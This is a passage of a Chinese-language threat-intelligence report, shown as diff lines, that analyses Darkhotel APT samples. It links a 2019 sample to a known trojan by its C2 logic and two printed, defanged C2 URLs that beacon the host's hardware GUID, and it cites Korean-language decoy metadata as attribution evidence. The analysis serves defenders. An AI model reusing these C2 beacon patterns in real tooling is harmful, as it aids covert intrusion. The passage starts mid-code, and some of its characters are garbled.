+return 0i64;  
+
+在针对本次Darkhotel活动的分析过程中，观察到不同样本载荷存在不同的特殊标志，具有定位数据位置的作用。这些残留的标志在Darkhotel以往的活动中也曾出现过，从时间轴来看，本次事件的活动与以往的活动存在重叠交叉，可以看出Darkhotel具备依据目标环境改变迅速迭代的能力，以及及时更新优化载荷代码的能力。  
+
+  
+图4-15Darkhotel特殊标志演化时间轴  
+
+经过详细比对，此2019年的老样本，即为腾讯安全团队2019年6月《"寄生兽”（Darkhotel）针对中国外贸人士的最新攻击活动披露》[3]报告中描述的Darkhotel特种木马。  
+
+与Darkhotel特种木马重叠的代码很多。例如，判断C2返回数据的开头是否为"<!DOCTYPEhtml>"，是则开始解密。若返回的是"reset"，则删除"vector.dat"文件：  
+
+  
+图4-162019年的样本  
+
+腾讯安全团队披露的样本  
+
+拼接C2URL的字段和值也完全一致：  
+
+2019年样本的C2:  
+
+http://service-security-manager[.]com/c50c9f6c-a306-41d0-8d24- bf0c3a5f4a0e/21270.php?vol $=$ honeycomb&q $=$ 4znZCTTa2J24&guid $=$ 本机硬件GUID  
+
+腾讯御见报告的样本C2：  
+
+http://game-service[.]org/584e3411-14a7-41f4-ba1d-e203609b0471/6126.php? vol=honeycomb&q $=$ 4znZCTTa2J24&guid $=$ 本机硬件GUID  
+
+4.部分诱饵文档的元数据包含韩语”刘号"和”号”，中文意思分别对应“标题"和"用户"：  
+
+  
+图4-18诱饵文档的元数据包含韩语  
+
+诱饵文档的作者在插入图片对象时，使用Office的默认语言也是韩语。  
+
+"引3"的中文意思是"图片3"：  
+
+  
+图4-19攻击者通过韩语版Office插入图片  
+
+## 5.小结  
+
+在针对Darkhotel在隔离网络渗透活动的分析过程中，根据文档元数据、漏洞利用特征、Ramsay感染特殊标志等又关联到Darkhotel近年来的相关活动，表明Darkhotel在网络空间攻击活动的持续性，以及发现高价值目标之后能够及时部署攻击策略、升级恶意代码感染技术、完善整体攻击流程，彰显Darkhotel的高级持续威胁属性。  
+
+在2019年安天发布《震网事件的九年再复盘与思考》【4]，表达了传统的反病毒引擎和威胁情报成为两个具有互补作用的机制，传统的反病毒引擎针对海量的恶意代码的检测、辨识能力，并且通过深度预处理、虚拟执行等机制来应对恶意代码的变种、变换，因此在载荷检测方面，有无以伦比的识别与解析深度，而且对海量载荷对象提供了精准的判定机制。在威胁情报金字塔中，HASH、IP、域名等"狭义情报被列入底层，即获取难度低、应用成本低。较为容易的被分析防御方提取为攻击指示器（信标），同时可以与多种安全设备、管理设备、防护软件等现有扩展接口实现对接。如果将Darkhotel此次针对隔离网络渗透活动与复杂度、完成度更高的A2pT震网比较，Darkhotel实现的成本更低，传播、感染、渗出的过程更加依赖人员带入，但在较长的可持续攻击周期中，依然存在达成目标的可能。同时，在本次针对Darkhotel的样本关联和组织归属的分析中，通过建立可靠的基础标识能力与响应机制，分析Darkhotel组织演化的TTP进程以及相关情报，形成了检测引擎与威胁情报结合分析的典型案例。  
+
+## 参考资料  
+
+[1]疑似DarkhotelAPT组织针对中国贸易行业高管的定向攻击披露  
+https://s.tencent.com/research/report/646.html  
+[2]DarkhotelAPT团伙新近活动的样本分析  
+https://ti.qianxin.com/blog/articles/analysis-of-darkhotel/  
+$\left[3\right]^{\prime\prime}$ 寄生兽”（Darkhotel）针对中国外贸人士的最新攻击活动披露  
+https://s.tencent.com/research/report/741.html  
+[4]震网事件的九年再复盘与思考  
+
+## 往期精选  
+
+·精准投放Tsunami僵尸网络和"魔铲"挖矿木马的行动分析  
+·勒索软件ProLock藏身图片，安天智甲有效防护  
+·安天对“超高能力网空威胁行为体"系列分析回顾  
+·履职这一年丨全国政协委员肖新光：全面提升网络安全应急保障能力  
